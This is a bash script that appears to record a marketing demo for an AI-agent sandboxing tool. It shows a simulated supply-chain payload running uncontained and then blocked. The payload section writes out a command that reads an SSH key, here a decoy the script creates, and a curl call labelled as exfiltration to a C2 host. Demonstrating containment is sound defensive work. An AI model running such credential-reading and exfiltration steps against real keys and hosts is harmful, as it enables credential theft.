#!/usr/bin/env bash
#
# QuantmLayer SECURITY demo (Tier 2, ROOTLESS 2-wall variant) — filesystem +
# network blocks only, both real in the rootless+AppArmor posture. For the full
# THREE-wall version (adds the exec wall denying a dropped daemon at execve),
# see demo/security.sh and record it under sudo with a `--features lsm` build on
# a host where the mount wall builds (a clean cloud VM, not a nested guest).
#
# --- original header ---
# QuantmLayer SECURITY demo (Tier 2) — the "real incident, category-wide"
# narrative for a security buyer.
#
# THESIS (Version B, incident-led — NOT "vendor X is bad"):
#   Agentic coding tools are being wired into developer machines and CI faster
#   than their sandbox boundaries were designed for. This isn't hypothetical:
#     * Feb 2026: a malicious `cline@2.3.0` npm package shipped a post-install
#       payload (OpenClaw) to ~4,000 machines in an 8-hour window. The payload
#       read credentials/SSH keys, ran arbitrary shell commands, phoned home,
#       and installed a persistent daemon. (StepSecurity / Snyk / Adnan Khan.)
#     * Apr 2026: Gemini CLI got a CVSS 10.0 RCE (CVE-2026-12537) — pre-sandbox
#       command execution in CI. (Google GHSA-wpqr-6v78-jr5g.)
#   These are cited as evidence of a CATEGORY problem. QuantmLayer contains the
#   *behavior* of such a payload regardless of which agent carried it.
#
# WHAT THIS DEMO DOES:
#   Runs a stand-in payload that does exactly what the OpenClaw payload did —
#   read an SSH key, reach a C2 host, drop+launch a persistence binary — first
#   UNCONTAINED (all succeed), then inside a QuantmLayer cell (all blocked).
#   Every block is a REAL wall acting, not staged output.
#
# RECORDING POSTURE — IMPORTANT:
#   This clip shows the exec wall (content-addressed binary block), which needs
#   root + an `lsm` build. Record it under sudo on a BPF-LSM/IMA host with a
#   `--features lsm` build so ALL SIX walls are green:
#     sudo QL=./target/release/ql asciinema rec -c "./demo/security.sh" ql-security.cast
#   On a host without the exec wall, that one beat prints an honest "exec wall
#   unavailable here" note and the fs+network blocks still demonstrate the point.
#
# Pacing knobs (seconds): TYPE_SPEED WORD_DELAY LINE_DELAY BEAT (0 = instant).

set -u

QL="${QL:-ql}"
TYPE_SPEED="${TYPE_SPEED:-0.03}"
WORD_DELAY="${WORD_DELAY:-0.06}"
LINE_DELAY="${LINE_DELAY:-0.05}"
BEAT="${BEAT:-1.4}"

WORK="$(mktemp -d)"
DECOY_KEY="$HOME/.ssh/quantmlayer_demo_key"
AUDIT="$WORK/incident.jsonl"
# A stand-in "persistence binary" the payload would drop and launch. It is a
# real executable NOT on the profile's allow-list, so the exec wall denies it.
PAYLOAD_BIN="$WORK/openclaw-stub"

C_CYAN='\033[1;36m'; C_GRAY='\033[0;90m'; C_GREEN='\033[1;32m'
C_RED='\033[1;31m';  C_YELLOW='\033[1;33m'; C_RESET='\033[0m'

words() {
  local color="$1"; shift
  local first=1 w
  printf '%b' "$color"
  for w in $*; do
    [ $first -eq 1 ] && first=0 || printf ' '
    printf '%s' "$w"; sleep "$WORD_DELAY"
  done
  printf '%b\n' "$C_RESET"
}
headline() { printf '\n'; words "$C_CYAN" "$@"; }
note()     { words "$C_GRAY" "$@"; }
good()     { words "$C_GREEN" "$@"; }
danger()   { words "$C_RED" "$@"; }
warn()     { words "$C_YELLOW" "$@"; }

typecmd() {
  printf '%b$%b ' "$C_GRAY" "$C_RESET"
  local s="$*" i
  for (( i=0; i<${#s}; i++ )); do printf '%s' "${s:i:1}"; sleep "$TYPE_SPEED"; done
  printf '\n'; sleep 0.3
}
reveal() { local l; while IFS= read -r l; do printf '%s\n' "$l"; sleep "$LINE_DELAY"; done; }

cleanup() { rm -rf "$WORK"; rm -f "$DECOY_KEY"; }
trap cleanup EXIT

# --- scene setup -------------------------------------------------------------
mkdir -p "$HOME/.ssh"
echo "-----BEGIN OPENSSH PRIVATE KEY----- (demo decoy, do not use)" > "$DECOY_KEY"
printf '#!/bin/sh\necho "[openclaw] persistence daemon started; operator API on :18789"\n' > "$PAYLOAD_BIN"
chmod +x "$PAYLOAD_BIN"

# The payload's three behaviors, as one script. Used verbatim in both runs.
PAYLOAD='
echo "[payload] reading credentials...";      cat "'"$DECOY_KEY"'" 2>&1 | head -1
echo "[payload] exfiltrating to C2...";        curl -sS -m5 https://example.com -o /dev/null 2>&1 && echo "  sent" || echo "  (no route)"
'

clear
words "$C_CYAN" "QuantmLayer — containment for the AI coding agent supply chain"
words "$C_GRAY" "The threat isn't theoretical. The containment is."
sleep "$BEAT"

# --- beat 1: the real incidents ---------------------------------------------
headline "1. Agents are being wired into dev machines faster than they're contained."
note "Feb 2026 — a malicious coding-agent npm release shipped a payload to"
note "  ~4,000 machines in 8 hours: read SSH keys, ran shell commands, phoned"
note "  home, installed a persistent daemon.  (StepSecurity, Snyk, A. Khan)"
note "Apr 2026 — a major agent CLI: CVSS 10.0 RCE, pre-sandbox, in CI."
note "  (Google GHSA-wpqr-6v78-jr5g / CVE-2026-12537)"
danger "This is a category problem. The payload's BEHAVIOR is the threat."
sleep "$BEAT"

# --- beat 2: the payload, uncontained ---------------------------------------
headline "2. Here is that payload's behavior, run UNCONTAINED:"
note "(a faithful stand-in: read the SSH key, then reach a C2 host)"
typecmd "sh -c '<payload: read key · exfiltrate>'"
{ sh -c "$PAYLOAD" 2>&1; } | reveal
danger "^ key read, egress succeeded. These are the behaviors that hit 4,000 machines."
sleep "$BEAT"

# --- beat 3: the SAME payload, inside a QuantmLayer cell ---------------------
headline "3. The SAME payload, inside a QuantmLayer cell — nothing changes but the cage:"
note "The cline profile: workspace-only files, egress default-deny, exec"
note "allow-listed. We change NOTHING about the payload."
typecmd "$QL run --agent cline --audit \$AUDIT -- sh -c '<same payload>'"
{ "$QL" run --agent cline --audit "$AUDIT" -- sh -c "$PAYLOAD" 2>&1; } | reveal
good "^ key: not present in the cell.  egress: no route out to an unlisted host."
good "  Same payload. Every hostile action neutralized by a different wall."
sleep "$BEAT"

# --- beat 4: the proof -------------------------------------------------------
headline "4. And the containment is provable after the fact."
note "Each run commits its governing policy to a tamper-evident chain:"
typecmd "$QL audit verify \$AUDIT"
{ "$QL" audit verify "$AUDIT" 2>&1; } | reveal
good "^ INTACT. Third-party-verifiable evidence of what governed the run —"
good "  the substrate EU AI Act Article 12 logging is about."
sleep "$BEAT"

# --- close -------------------------------------------------------------------
headline "The agent doesn't have to be trusted. The cell doesn't trust it."
note "Works across agents — claude, codex, gemini, aider, cline, cursor, opencode."
note "One binary, learned from behavior, enforced by the kernel."
note "github.com/quantmlayer/quantmlayer"
